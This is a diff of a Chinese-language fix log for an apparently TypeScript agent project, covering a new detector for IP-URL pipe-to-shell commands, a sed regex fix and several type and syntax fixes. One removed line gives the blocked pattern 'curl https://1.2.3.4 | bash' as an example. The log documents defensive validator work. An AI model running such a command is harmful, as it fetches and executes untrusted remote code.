@@ -8,9 +8,11 @@
 ---
 
 **修复记录（2026-04-06）：**
-- `bash-verification.ts`: 新增 `validateIpUrlPipe` 检测器，拦截 `curl https://1.2.3.4 | bash` 类型攻击
-- `sed-validation.ts`: 修复 `/\\(.*\\|/g` regex 导致的安全 sed 命令 false positive 误拦截
-- `microCompact.ts`: 修复 `message.type` → `message.role`（pi-ai types 使用 `role` 非 `type`）
+- `bash-verification.ts`: 新增 `validateIpUrlPipe` 检测器，拦截 IP URL pipe to shell
+- `sed-validation.ts`: 修复 regex 导致的安全 sed 命令 false positive 误拦截
+- `utils/signal.ts`: 修复 `SignalList` 重复 `get()` 方法 → TypeScript overload 声明
+- `agents/partitionToolCalls.ts`: 修复 `ToolCall` 未从 pi-agent-core 导出 → 本地 type 定义
+- `agents/bash-tools.exec.ts`: 修复函数结尾多余 `}` 语法错误
 
 ---
 
